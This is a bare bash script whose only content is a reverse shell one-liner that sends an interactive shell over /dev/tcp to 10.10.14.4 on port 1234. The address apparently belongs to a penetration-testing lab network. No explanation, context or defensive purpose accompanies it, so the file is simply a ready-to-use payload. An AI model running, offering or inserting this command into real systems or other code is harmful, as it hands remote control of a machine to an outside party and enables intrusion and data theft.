#!/bin/bash

bash -i >& /dev/tcp/10.10.14.4/1234 0>&1
